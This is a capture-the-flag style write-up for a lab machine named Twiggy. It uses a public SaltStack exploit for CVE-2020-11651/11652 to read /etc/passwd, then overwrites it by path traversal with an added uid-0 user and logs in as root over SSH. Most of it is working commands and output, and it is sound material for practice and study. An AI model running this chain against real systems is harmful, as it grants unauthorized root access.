##### Tags: `Writable file`  `SUID-l`  `Python Flask`  `Web-enum`

# 🐧Twiggy🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.242.62 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 18:38 AEDT
Nmap scan report for 192.168.242.62
Host is up (0.22s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 406.01 seconds
```
check the web and didn't have anything    
then search ztmp exploit got the RCE script
```
google search zmtp 2.0 exploit
Exploit Title: Saltstack 3000.1 - Remote Code Execution
```
look how the script works
```$ python3 48421.py -h                                                    
usage: 48421.py [-h] [--master MASTER_IP] [--port MASTER_PORT] [--force] [--debug] [--run-checks]
                [--read READ_FILE] [--upload-src UPLOAD_SRC] [--upload-dest UPLOAD_DEST] [--exec EXEC]
                [--exec-all EXEC_ALL]

Saltstack exploit for CVE-2020-11651 and CVE-2020-11652

options:
  -h, --help            show this help message and exit
  --master, -m MASTER_IP
  --port, -p MASTER_PORT
  --force, -f
  --debug, -d
  --run-checks, -c
  --read, -r READ_FILE
  --upload-src UPLOAD_SRC
  --upload-dest UPLOAD_DEST
  --exec EXEC           Run a command on the master
  --exec-all EXEC_ALL   Run a command on all minions
```
It can read file, upload file and execute it  
Try to read the /etc/passwd file and it works
```
$ python3 48421.py --master 192.168.242.62 --port 4506 --read /etc/passwd                           
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/usr/local/lib/python3.13/dist-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.242.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: YW+X7MyAJUrsskh2mt7TkF3FvyJaWLbGfylEiu5AdjFu9Rr8ggmt+HuXNPmPn9rfU1T7rmGnPCY=
[+] Attemping to read /etc/passwd from 192.168.242.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
```
then try to add a user to the root groups and login  
openssl to create a password 
```
$ openssl passwd password123
$1$3/sbSf3N$MlLMTctwM/.BK9GOAmqm3.
```
replace the x with the output
```
root2:$1$3/sbSf3N$MlLMTctwM/.BK9GOAmqm3.:0:0:root:/root:/bin/bash
```
upload the file to place the origin one
```
$ python3 48421.py --master 192.168.242.62 --port 4506 --upload-src passwd --upload-dest ../../../../../etc/passwd 
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/usr/local/lib/python3.13/dist-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.242.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: YW+X7MyAJUrsskh2mt7TkF3FvyJaWLbGfylEiu5AdjFu9Rr8ggmt+HuXNPmPn9rfU1T7rmGnPCY=
[+] Attemping to upload passwd to ../../../../../etc/passwd on 192.168.242.62
[ ] Wrote data to file /srv/salt/../../../../../etc/passwd
```
login via ssh with the new user root2
```
─$ ssh root2@192.168.242.62  
root2@192.168.242.62's password: 
Last failed login: Sat Jan 31 04:58:59 EST 2026 from 192.168.45.208 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Sat Jan 31 03:49:14 2026 from 192.168.45.208
[root@twiggy ~]# id
uid=0(root) gid=0(root) groups=0(root)
```
And we got the root shell
```
